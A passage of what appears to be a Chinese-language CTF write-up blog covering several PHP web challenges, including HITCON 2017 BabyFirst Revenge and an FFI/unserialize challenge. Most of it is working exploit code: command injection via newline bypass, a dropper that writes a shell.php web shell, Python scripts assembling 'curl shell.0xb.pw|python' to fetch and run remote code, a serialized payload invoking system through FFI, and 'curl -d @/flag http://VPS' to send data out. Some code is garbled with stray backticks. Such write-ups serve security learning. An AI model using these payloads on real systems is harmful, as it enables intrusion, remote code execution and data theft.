     <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    exec(<span class="string">'./ '</span> . implode(<span class="string">" "</span>, $args));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>解题：<br>从源码可以看出index.php可以执行纯字母数字的linux命令，目标是去读flag.php文件中的flag. </p>
<ol>
<li>利用换行可绕过正则表达式执行命令。 </li>
<li>通过生成ip地址长整数绕过正则表达式，下载exploit脚本。 </li>
<li>通过tar命令将无后缀脚本打包，再用php命令执行</li>
</ol>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Example:</span><br><span class="line">http://localhost/index.php?args[]=whatever%0a&amp;args[]=mkdir&amp;args[]=test%0a&amp;args[]=cd&amp;args[]=test%0a&amp;args[]=wget&amp;args[]=3232246578  (本地ip的长整型,wget IP是会获得首页，所以可以把脚本写到index.html里）</span><br><span class="line">http://localhost/index.php?args[]=whatever%0a&amp;args[]=tar&amp;args[]=cvf&amp;args[]=exploit&amp;args[]=test%0a&amp;args[]=php&amp;args[]=exploit</span><br></pre></td></tr></table></figure>

<p>可以看到./后面跟了一个空格，所以无论如何都没有办法一条命令解决。这个时候需要使用多条命令。<br>首先使用%0A做截断，相当于换行执行之后的命令。之后就是想办法传入shell<br>因为没有办法直接下载一个php文件（正则限制不能包含点）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">file_put_contents(&#39;shell.php&#39;, &#39;&lt;?php header(&quot;Content-Type: text&#x2F;plain&quot;);</span><br><span class="line">print shell_exec($_GET[&quot;cmd&quot;]);?&gt;</span><br><span class="line">&#39;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>所以将上面的脚本放到自己的服务器上，然后通过wget获取之后用tar打包<br> 然后再用php执行tar包即可写入一个shell文件，然后就可以拿到flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http：&#x2F;&#x2F;localhost&#x2F;shell.php?cat flag.php</span><br><span class="line">http:&#x2F;&#x2F;192.168.43.94:32778&#x2F;sandbox&#x2F;192.168.43.50&#x2F;shell.php?cmd&#x3D;cat%20..&#x2F;..&#x2F;flag.php</span><br></pre></td></tr></table></figure>

<h2 id="HITCON-CTF-2017-BabyFirst-Revenge"><a href="#HITCON-CTF-2017-BabyFirst-Revenge" class="headerlink" title="HITCON CTF 2017-BabyFirst Revenge"></a>HITCON CTF 2017-BabyFirst Revenge</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">   $sandbox &#x3D; &#39;&#x2F;www&#x2F;sandbox&#x2F;&#39; . md5(&quot;orange&quot; . $_SERVER[&#39;REMOTE_ADDR&#39;]);</span><br><span class="line">   @mkdir($sandbox);</span><br><span class="line">   @chdir($sandbox);</span><br><span class="line">   if (isset($_GET[&#39;cmd&#39;]) &amp;&amp; strlen($_GET[&#39;cmd&#39;]) &lt;&#x3D; 5) &#123;</span><br><span class="line">       @exec($_GET[&#39;cmd&#39;]);</span><br><span class="line">   &#125; else if (isset($_GET[&#39;reset&#39;])) &#123;</span><br><span class="line">       @exec(&#39;&#x2F;bin&#x2F;rm -rf &#39; . $sandbox);</span><br><span class="line">   &#125;</span><br><span class="line">   highlight_file(__FILE__);</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">&gt;-t\\</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">from time import sleep</span><br><span class="line">from urllib import quote</span><br><span class="line">payload &#x3D; [</span><br><span class="line">   # generate &#96;ls -t&gt;g&#96; file</span><br><span class="line">   &#39;&gt;ls\\&#39;, </span><br><span class="line">   &#39;ls&gt;_&#39;, </span><br><span class="line">   &#39;&gt;\ \\&#39;, </span><br><span class="line">   &#39;&gt;-t\\&#39;, </span><br><span class="line">   &#39;&gt;\&gt;g&#39;, </span><br><span class="line">   &#39;ls&gt;&gt;_&#39;, </span><br><span class="line">   # generate &#96;curl orange.tw.tw&gt;python&#96;</span><br><span class="line">   # curl shell.0xb.pw|python</span><br><span class="line">   &#39;&gt;on&#39;, </span><br><span class="line">   &#39;&gt;th\\&#39;, </span><br><span class="line">   &#39;&gt;py\\&#39;,</span><br><span class="line">   &#39;&gt;\|\\&#39;, </span><br><span class="line">   &#39;&gt;pw\\&#39;, </span><br><span class="line">   &#39;&gt;x.\\&#39;,</span><br><span class="line">   &#39;&gt;xx\\&#39;, </span><br><span class="line">   &#39;&gt;l.\\&#39;, </span><br><span class="line">   &#39;&gt;el\\&#39;, </span><br><span class="line">   &#39;&gt;sh\\&#39;, </span><br><span class="line">   &#39;&gt;\ \\&#39;, </span><br><span class="line">   &#39;&gt;rl\\&#39;, </span><br><span class="line">   &#39;&gt;cu\\&#39;, </span><br><span class="line">   # exec</span><br><span class="line">   &#39;sh _&#39;, </span><br><span class="line">   &#39;sh g&#39;, </span><br><span class="line">]</span><br><span class="line"># r &#x3D; requests.get(&#39;http:&#x2F;&#x2F;localhost&#x2F;tmp&#x2F;?reset&#x3D;1&#39;)</span><br><span class="line">for i in payload:</span><br><span class="line">   assert len(i) &lt;&#x3D; 5 </span><br><span class="line">   r &#x3D; requests.get(&#39;http:&#x2F;&#x2F;localhost&#x2F;tmp&#x2F;?cmd&#x3D;&#39; + quote(i) )</span><br><span class="line">   print i</span><br><span class="line">   sleep(0.2)</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"> -*- coding:utf8 -*-</span><br><span class="line">import&#96; &#96;requests as r</span><br><span class="line">import&#96; &#96;hashlib</span><br><span class="line">url &#96;&#96;&#x3D;&#96; &#96;&#39;http:&#x2F;&#x2F;52.199.204.34&#x2F;&#39;</span><br><span class="line"># 查询自己的IP</span><br><span class="line">ip &#96;&#96;&#x3D;&#96; &#96;r.get(&#96;&#96;&#39;http:&#x2F;&#x2F;ipv4.icanhazip.com&#x2F;&#39;&#96;&#96;).text.strip()</span><br><span class="line">sandbox &#96;&#96;&#x3D;&#96; &#96;url &#96;&#96;+&#96; &#96;&#39;sandbox&#x2F;&#39;&#96; &#96;+&#96; &#96;hashlib.md5(&#96;&#96;&#39;orange&#39;&#96; &#96;+&#96; &#96;ip).hexdigest() &#96;&#96;+&#96; &#96;&#39;&#x2F;&#39;</span><br><span class="line"> </span><br><span class="line">reset &#96;&#96;&#x3D;&#96; &#96;url &#96;&#96;+&#96; &#96;&#39;?reset&#39;</span><br><span class="line">cmd &#96;&#96;&#x3D;&#96; &#96;url &#96;&#96;+&#96; &#96;&#39;?cmd&#x3D;&#39;</span><br><span class="line">build &#96;&#96;&#x3D;&#96; &#96;[&#96;&#96;&#39;&gt;cur\\&#39;&#96;&#96;,</span><br><span class="line">     &#96;&#96;&#39;&gt;l\ \\&#39;&#96;&#96;,</span><br><span class="line">     &#96;&#96;&#39;ls&gt;A&#39;&#96;&#96;,</span><br><span class="line">     &#96;&#96;&#39;rm c*&#39;&#96;&#96;,</span><br><span class="line">     &#96;&#96;&#39;rm l*&#39;&#96;&#96;,</span><br><span class="line">     &#96;&#96;&#39;&gt;105\\&#39;&#96;&#96;,</span><br><span class="line">     &#96;&#96;&#39;&gt;304\\&#39;&#96;&#96;,</span><br><span class="line">     &#96;&#96;&#39;&gt;301\\&#39;&#96;&#96;,</span><br><span class="line">     &#96;&#96;&#39;&gt;9\&gt;\\&#39;&#96;&#96;,</span><br><span class="line">     &#96;&#96;&#39;ls&gt;&gt;A&#39;&#96;&#96;,</span><br><span class="line">     &#96;&#96;&#39;sh A&#39;&#96;&#96;,</span><br><span class="line">     &#96;&#96;&#39;php A&#39;</span><br><span class="line">     &#96;&#96;]</span><br><span class="line"># 如果目标服务器有GET，这个也是可以打的</span><br><span class="line"># build &#x3D; [&#39;&gt;GE\\&#39;,</span><br><span class="line">#     &#39;&gt;T\\ \\&#39;,</span><br><span class="line">#     &#39;ls&gt;A&#39;,</span><br><span class="line">#     &#39;rm G*&#39;,</span><br><span class="line">#     &#39;rm T*&#39;,</span><br><span class="line">#     &#39;&gt;105\\&#39;,</span><br><span class="line">#     &#39;&gt;304\\&#39;,</span><br><span class="line">#     &#39;&gt;301\\&#39;,</span><br><span class="line">#     &#39;&gt;9\&gt;\\&#39;,</span><br><span class="line">#     &#39;ls&gt;&gt;A&#39;]</span><br><span class="line">r.get(reset)</span><br><span class="line">for&#96; &#96;i &#96;&#96;in&#96; &#96;build:</span><br><span class="line">  &#96;&#96;s &#96;&#96;&#x3D;&#96; &#96;r.get(cmd &#96;&#96;+&#96; &#96;i)</span><br><span class="line">  &#96;&#96;print&#96; &#96;&#39;[%s]&#39;&#96; &#96;%&#96; &#96;s.status_code, s.url</span><br><span class="line"> </span><br><span class="line">s &#96;&#96;&#x3D;&#96; &#96;r.get(sandbox &#96;&#96;+&#96; &#96;&#39;fun.php?cmd&#x3D;uname -a&#39;&#96;&#96;)</span><br><span class="line">print&#96; &#96;&#39;\n&#39;&#96; &#96;+&#96; &#96;&#39;[%s]&#39;&#96; &#96;%&#96; &#96;s.status_code, s.url</span><br><span class="line">print&#96; &#96;s.text</span><br></pre></td></tr></table></figure>

<p>最终成功</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">from time import sleep</span><br><span class="line">from urllib import quote  </span><br><span class="line">payload &#x3D; [</span><br><span class="line">   &#39;&gt;ls\\&#39;, </span><br><span class="line">   &#39;ls&gt;_&#39;, </span><br><span class="line">   &#39;&gt;\ \\&#39;, </span><br><span class="line">   &#39;&gt;-t\\&#39;, </span><br><span class="line">   &#39;&gt;\&gt;g&#39;, </span><br><span class="line">   &#39;ls&gt;&gt;_&#39;,</span><br><span class="line">   </span><br><span class="line"></span><br><span class="line">	&#39;&gt;A\ \\&#39;,</span><br><span class="line">   &#39;&gt;\&gt;\\&#39;, </span><br><span class="line">   &#39;&gt;pw\\&#39;, </span><br><span class="line">   &#39;&gt;x.\\&#39;,</span><br><span class="line">   &#39;&gt;xx\\&#39;, </span><br><span class="line">   &#39;&gt;l.\\&#39;, </span><br><span class="line">   &#39;&gt;el\\&#39;, </span><br><span class="line">   &#39;&gt;sh\\&#39;, </span><br><span class="line">   &#39;&gt;\ \\&#39;, </span><br><span class="line">   &#39;&gt;rl\\&#39;, </span><br><span class="line">   &#39;&gt;cu\\&#39;, </span><br><span class="line">   &#39;sh _&#39;, </span><br><span class="line">   &#39;sh g&#39;,</span><br><span class="line">   &#39;php A&#39;</span><br><span class="line">   # exe</span><br><span class="line">]</span><br><span class="line"># r &#x3D; requests.get(&#39;http:&#x2F;&#x2F;localhost&#x2F;tmp&#x2F;?reset&#x3D;1&#39;)</span><br><span class="line">for i in payload:</span><br><span class="line">   assert len(i) &lt;&#x3D; 5 </span><br><span class="line">   r &#x3D; requests.get(&#39;http:&#x2F;&#x2F;192.168.43.94:32780?cmd&#x3D;&#39; + quote(i) )</span><br><span class="line">   print i</span><br><span class="line">   sleep(0.2)</span><br></pre></td></tr></table></figure>













<h2 id="题"><a href="#题" class="headerlink" title="题"></a>题</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#39;a&#39;])) &#123;</span><br><span class="line">    eval($_GET[&#39;a&#39;]);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> system(<span class="string">"ls"</span>);</span><br><span class="line">a=<span class="keyword">echo</span> phpinfo();</span><br><span class="line">a=phpinfo();</span><br><span class="line"></span><br><span class="line">收集一波phpinfo的信息</span><br><span class="line"></span><br><span class="line">disable_functions	set_time_limit,ini_set,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,mail,putenv,error_log,dl</span><br><span class="line">open_basedir	/<span class="keyword">var</span>/www/html</span><br><span class="line">opcache.preload	/<span class="keyword">var</span>/www/html/preload.php</span><br><span class="line">FFI</span><br><span class="line">FFI support	enabled</span><br><span class="line">disable_classes	ReflectionClass	ReflectionClass</span><br><span class="line"></span><br><span class="line">    但没有过滤scandir()</span><br><span class="line">    </span><br><span class="line">a=var_dump(scandir(<span class="string">'/var/www/html'</span>));</span><br><span class="line">var_dump(scandir(getcwd()));</span><br><span class="line">print_r(scandir(<span class="string">'./'</span>));</span><br><span class="line"></span><br><span class="line">show_source(<span class="string">"preload.php"</span>);</span><br><span class="line"><span class="comment">//利用file_get_contents()查看preload.php源码</span></span><br><span class="line"><span class="comment">//echo file_get_contents('preload.php');</span></span><br><span class="line"></span><br><span class="line">a=<span class="keyword">include</span>(<span class="string">'preload.php'</span>);var_dump(unserialize(<span class="string">'C:1:"A":150:&#123;a:3:&#123;s:3:"ret";N;s:4:"func";s:7:"print_r";s:3:"arg";a:3:&#123;s:1:"a";s:5:"apple";s:1:"b";s:6:"banana";s:1:"c";a:3:&#123;i:0;s:1:"x";i:1;s:1:"y";i:2;s:1:"z";&#125;&#125;&#125;&#125;'</span>)-&gt;__get(<span class="string">'ret'</span>));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">A</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $data = [</span><br><span class="line">        <span class="string">'ret'</span> =&gt; <span class="keyword">null</span>,</span><br><span class="line">        <span class="string">'func'</span> =&gt; <span class="string">'print_r'</span>,</span><br><span class="line">        <span class="string">'arg'</span> =&gt; <span class="string">'666'</span></span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data[<span class="string">'ret'</span>] = <span class="keyword">$this</span>-&gt;data[<span class="string">'func'</span>](<span class="keyword">$this</span>-&gt;data[<span class="string">'arg'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__serialize</span><span class="params">()</span>: <span class="title">array</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unserialize</span><span class="params">(array $data)</span> </span>&#123;</span><br><span class="line">        array_merge(<span class="keyword">$this</span>-&gt;data, $data);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;run();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">serialize</span> <span class="params">()</span>: <span class="title">string</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> serialize(<span class="keyword">$this</span>-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">unserialize</span><span class="params">($payload)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data = unserialize($payload);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;run();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span> <span class="params">($key)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data[$key];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span> <span class="params">($key, $value)</span> </span>&#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">       </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$A = <span class="keyword">new</span> A();</span><br><span class="line">    var_dump(serialize($A))</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">安装php7<span class="number">.4</span>-dev</span><br><span class="line"></span><br><span class="line">apt install libsqlite3-dev libffi-dev bison re2c pkg-config</span><br><span class="line">git <span class="keyword">clone</span> https:<span class="comment">//github.com/php/php-src.git</span></span><br><span class="line">cd php-src</span><br><span class="line">git checkout PHP<span class="number">-7.4</span></span><br><span class="line">./buildconf</span><br><span class="line">./configure --prefix=$HOME/myphp --with-config-file-path=$HOME/myphp/lib --with-ffi --enable-opcache --enable-cli</span><br><span class="line">make -j $(nproc) &amp;&amp; make install</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">☁  bin  ./php -r <span class="string">'$ffi = FFI::cdef("int system(char *command);","libc.so.6"); $ffi-&gt;system("whoami");'</span> </span><br><span class="line">river</span><br><span class="line">☁  bin  ./php -r <span class="string">'$ffi = FFI::cdef("int system(char *command);",           ); $ffi-&gt;system("whoami");'</span></span><br><span class="line">river</span><br><span class="line">☁  bin  ./php -r <span class="string">'$ffi = FFI::cdef("int system(char *command);",           ); $ffi-&gt;system("id");'</span></span><br></pre></td></tr></table></figure>

<p>base64</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">    </span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">A</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $data = [</span><br><span class="line">        <span class="string">'ret'</span> =&gt; <span class="keyword">null</span>,</span><br><span class="line">        <span class="string">'func'</span> =&gt; <span class="string">'FFI::cdef'</span>,</span><br><span class="line">        <span class="string">'arg'</span> =&gt; <span class="string">'int system(char *command);'</span></span><br><span class="line">    ];</span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"run&lt;br&gt;"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data[<span class="string">'ret'</span>] = <span class="keyword">$this</span>-&gt;data[<span class="string">'func'</span>](<span class="keyword">$this</span>-&gt;data[<span class="string">'arg'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">serialize</span> <span class="params">()</span>: <span class="title">string</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> serialize(<span class="keyword">$this</span>-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">unserialize</span><span class="params">($payload)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data = unserialize($payload);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;run();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span> <span class="params">($key)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data[$key];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span> <span class="params">($key, $value)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> \<span class="keyword">Exception</span>(<span class="string">'No implemented'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"__construct&lt;br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> A();</span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize($a)); <span class="comment">// 即payload</span></span><br><span class="line">这里的EXP代码中删除了原有的 __serialize 、 __unserialize 两个函数，这是因为在反序列化时会触发 __unserialize 函数，这一特性是在PHP7<span class="number">.4</span>中新加入的，具体可参考：https:<span class="comment">//wiki.php.net/rfc/custom_object_serialization 。</span></span><br><span class="line">然后访问 http:<span class="comment">//题目/?a=unserialize(base64_decode(上面生成的payload))-&gt;__serialize()['ret']-&gt;system(系统命令); ，这里的命令执行的结果不会回显，可以用VPS接收flag，执行命令 curl -d @/flag http://VPS 就行了</span></span><br></pre></td></tr></table></figure>

<p>2.</p>
<blockquote>
<p>O:1:”A”:3:{s:3:”ret”;N;s:4:”func”;s:7:”print_r”;s:3:”arg”;s:3:”666”;}</p>
<p><strong>C</strong>:1:”A”:<strong>6</strong>3:<strong>{a:3:</strong>{s:3:”ret”;N;s:4:”func”;s:7:”print_r”;s:3:”arg”;s:3:”666”;}<strong>}</strong></p>
</blockquote>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">?a=<span class="keyword">include</span>(<span class="string">'preload.php'</span>);var_dump(unserialize(<span class="string">'</span></span><br><span class="line"><span class="string">C:1:"A":63:&#123;a:3:&#123;s:3:"ret";N;s:4:"func";s:7:"print_r";s:3:"arg";s:3:"666";&#125;&#125;</span></span><br><span class="line"><span class="string">'</span>)-&gt;__get(<span class="string">"ret"</span>));</span><br><span class="line"></span><br><span class="line">a=<span class="keyword">include</span>(<span class="string">'preload.php'</span>);var_dump(unserialize(<span class="string">'C:1:"A":150:&#123;a:3:&#123;s:3:"ret";N;s:4:"func";s:7:"print_r";s:3:"arg";a:3:&#123;s:1:"a";s:5:"apple";s:1:"b";s:6:"banana";s:1:"c";a:3:&#123;i:0;s:1:"x";i:1;s:1:"y";i:2;s:1:"z";&#125;&#125;&#125;&#125;'</span>)-&gt;__get(<span class="string">'ret'</span>));</span><br><span class="line"></span><br><span class="line">O:<span class="number">1</span>:<span class="string">"A"</span>:<span class="number">3</span>:&#123;s:<span class="number">3</span>:<span class="string">"ret"</span>;N;s:<span class="number">4</span>:<span class="string">"func"</span>;s:<span class="number">9</span>:<span class="string">"FFI::cdef"</span>;s:<span class="number">3</span>:<span class="string">"arg"</span>;s:<span class="number">26</span>:<span class="string">"int system(char *command);"</span>;&#125;</span><br><span class="line">C:<span class="number">1</span>:<span class="string">"A"</span>:<span class="number">89</span>:&#123;a:<span class="number">3</span>:&#123;s:<span class="number">3</span>:<span 